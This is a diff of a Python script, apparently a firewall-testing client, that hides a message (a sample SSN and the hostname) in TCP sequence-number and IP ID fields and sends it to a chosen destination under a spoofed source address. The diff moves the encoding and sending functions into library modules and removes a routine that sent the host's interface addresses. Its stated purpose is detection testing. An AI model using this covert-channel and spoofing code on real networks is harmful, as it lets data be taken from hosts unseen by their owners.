@@ -68,6 +68,7 @@ from lib import ipidFerret
 import IPy
 from optparse import OptionParser
 
+# Use OptionParser just to make the interface and feedback nice
 parser = OptionParser()
 parser.add_option ("-d", "--dest", dest="destination_ip", default="foo",
                     help="Destination IP for the hidden message")
@@ -84,12 +85,13 @@ spoof = options.spoof_ip
 dstport = int(options.dstport)
 mode = options.mode
 
+# Validate all the user input
+
 # Ensure we have a destination specified
 if destination == "foo":
     parser.print_help()
     exit(0)
 
-# Make sure IP addresses are real
 try:
     IPy.IP(destination)
 except ValueError:
@@ -113,244 +115,31 @@ while mode != 'demo' and mode != 'live':
 	mode = raw_input("Use a valid mode (live/demo):")
 
 
-# ================
-# Global variables
-# ================
-
-# Set the mode
-#-mode = 'demo'
-# mode = 'live'
-
 thishost = os.uname()[1]
-
-
 
 # An example sending a SSN, with the hyphens to make it look like a SSN. A
 # smooth criminal may try to obfuscate the SSN.
 # TEST: will a firewall detect this? should it?
 #message = '111-22-3333 from ' + thishost + '\n'
-message = 'foo bar 111-22-3333'
-# Clear before each use. Used by initial sequence numbers and IP ID tests
-#-exfilArray = []
-
-# Get destination from the command-line.
-#-destination = str(sys.argv[1])
-
-# Hard-code destination
-# TODO we should consider using a config for this and other testable things
-#-destination = '192.168.12'
-
-print '[+] destination: ' + destination
-
-# When using a bounce host, the bounce host will be the destination,
-# the source host will be our server.
-bounce = ''
-# Spoof our source
-#-spoof = '66.249.66.1'  # crawl-66-249-66-1.googlebot.com
-#spoof = '8.8.8.8'     # google-public-dns-a.google.com
-# Get our real ip. This is especially useful in NAT'd environments.
-interfaces = netifaces.interfaces()
-
-
-# =========
-# Functions
-# =========
-
-# TODO: Add functions to perform the various techniques to test a firewall against.
-
-# Print usage details
-#-def usage():
-    #- Should we set a sensible default? e.g. 127.0.0.1 80
-    #- print 'sudo ./dissferret-client.py [destination IP] [destination port]'
-
-
-# Does x fit in a 16bit int?
-# We need this for IPID
-def is_16bit(x):
-    bitl = (x).bit_length()
-    if bitl <= 16:
-        # print '[*] OK: int is 16bit'
-        return True
-    else:
-        # print '[-] Warning: int is too large.'
-        return False
-
-
-# Set the ttl=60 to indicate end-of-message
-def send_eom(pkt):
-    """Send the last message, encoded with a special TTL to let
-	the server know we're done.
-
-	Args:
-		pkt (Packet): Scapy packet
-    """
-    print '[*] Sending End-Of-Message'
-    pkt.window = 7331 # It's a magical number!
-    send(pkt)
-
-
-# Convert message
-# Lots of options here but we're going to convert each letter of the message
-# to its decimal equivalent.. which will be multiplied by the multiplier.
-
-
-def convert_ipid(message):
-    print '[*] converting ipid message: %s' % message
-    for char in message:
-        c = ord(char)
-        # While we are here, might as well generate our SYN packet sequence
-        # number.
-        exfilChar = c * 256
-        # Add to the global exfilArray.
-        if is_16bit(exfilChar):
-            # do nothing (refactor to if not?)
-            print '[+] IPID size OK'
-        else:
-            print '[-] Warning: IPID int too large %d. Setting to X' % exfilChar
-            # TODO: recover safely, setting to X for now
-            exfilChar = ord(X) * 256
-        exfilArray.append(exfilChar)
-        print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
-
-
-# I think single quotes are killing things
-def trim_message(message):
-    print '[*] trimming message'
-    trimmed = []
-    # Check for a valid char
-    for char in message:
-        # valid = re.match('^[\w-]+$', char) is not None
-        invalid = re.match('^\'', char) is not None
-        print '[*] invalid: %s is %s' % (char, invalid)
-        # Add valid chars to trimmed
-        if invalid == 'True':
-            print '[*] skipping %s' % char
-        else:
-            trimmed.append(char)
-    return trimmed
-
-
-
-
-def add_n0ise_ipid(i):
-    print '[*] adding n0ise to IPID..'
-    y = exfilArray[i]
-    # Add some randomness
-    randy = random.randint(-999, 999)  # too large will produce error
-    pkt.seq = y + randy
-    # Signal noisy packet
-    pkt.window = int(8182) - random.randint(23, 275)
-    try:
-        send(pkt)
-    except socket.error:
-        print "\nERROR: Problem sending packets, are you root?\n"
-        exit(0)
-
-
-# In IPv4, the Identification (ID) field is a 16-bit value.
-# TODO: validate value of ipid (must be a 16-bit value)
-def exfil_ipid():
-    print '[*] Attempting ID identification exfil..msglen', msglen
-    i = 0
-    for c in exfilArray:
-        print '[*] count i:', i
-        if i == msglen:
-            print '[*] EOM'
-        add_n0ise_ipid(i)
-        pkt.id = exfilArray[i]
-        pkt.window = 1338
-        time.sleep(0.4)
-        try:
-            send(pkt)
-        except socket.error:
-            print "\nERROR: Problem sending packets, are you root?\n"
-            exit(0)
-        i += 1
-    send_eom(pkt)
-
-
-
-def exfil_bounce():
-    print '[*] Attempting Ack sequence number bounce exfil..'
-    i = 0
-    for c in exfilArray:
-        # Can we use exfil_iseq instead.. by creating the packet with the
-        # appropriate header fields set?
-        add_n0ise_iseq(i)
-        pkt.window = 1339
-        pkt.seq = exfilArray[i]
-        time.sleep(0.4)
-        try:
-            send(pkt)
-        except socket.error:
-            print "\nERROR: Problem sending packets, are you root?\n"
-            exit(0)
-        i += 1
-    send_eom(pkt)
-
-
-# This function sends interface details for interfaces of interest, AF_INET
-# family. This function currently uses the initial sequence number.
-def send_iface():
-    print '[*] interfaces: %s' % interfaces
-    # Interesting in sending found en*, eth*, and wlp* interface data
-    for face in interfaces:
-        addrs = netifaces.ifaddresses(face)
-        # Get the MAC address
-        facemac = addrs[netifaces.AF_LINK]
-        try:
-            print face, netifaces.ifaddresses(face)[2], facemac
-            # Try to display en*
-            if 'en' in face or 'eth' in face or 'wlp' in face:
-                print '[*] found: %s' % face
-                message = str(netifaces.ifaddresses(face)[2])
-                # debugging
-                print '[*] New message: %s' % message
-                # trimmed = trim_message(message)
-                # print '[*] Trimmed message: %s' % trimmed
-                convert_message(message)
-                # Call the testing method we'd like to test
-                # TODO: run all tests or run a specific test, specify here.
-                exfil_iseq()
-        except:
-            # skip, do nothing
-            print "[-] interface does not contain AF_INET family."
+# TODO: Get this input from CLI or a file
+message = 'foo bar 111-22-3333' + ' from ' + thishost
 
 
 # ============
 # Main program
 # ============
 
+print '[+] destination: ' + destination
+
 # ==== use iseq
-# Convert our original message. Later we'll update our message and send
-# network interface data.
-#-exfilArray = convert_iseq(message)
-# How long is our message. We can use this when adding noise. If we use the
-# ttl then this will be easy to crack. We might be able to create an algorithm
-# that's complex enough to at least frustrate analysts.
-#-msglen = len(exfilArray)
-
-# Future work: adjust some fields to perhaps better emulate commonly seen traffic.
-# TODO we should add dport and flags as configurable options.
-# TODO add check, sys.argv[2] must be between 1-65565
-#-dstport = int(sys.argv[2])
-# Craft our basic packet.
-#-pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')
-
-# Attempt data exfiltration using initial sequence numbers
+print '[*] Testing method Initial Sequence..'
 initialSeqFerret.exfil_iseq(spoof, destination, dstport, message)
 print '[*] Sent using iseq: %s' % message
 
-print 'All done'
-exit()
-exfilArray = []  # clear before each use
 
 # ==== use IPID
 print '[*] Testing method IPID..'
-pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')  # reset our packet
-convert_ipid(message)
-msglen = len(exfilArray)
-exfil_ipid()
+ipidFerret.exfil_ipid(spoof, destination, dstport, message)
 print '[*] Sent using IPID: %s' % message
 
 # exfilArray = []
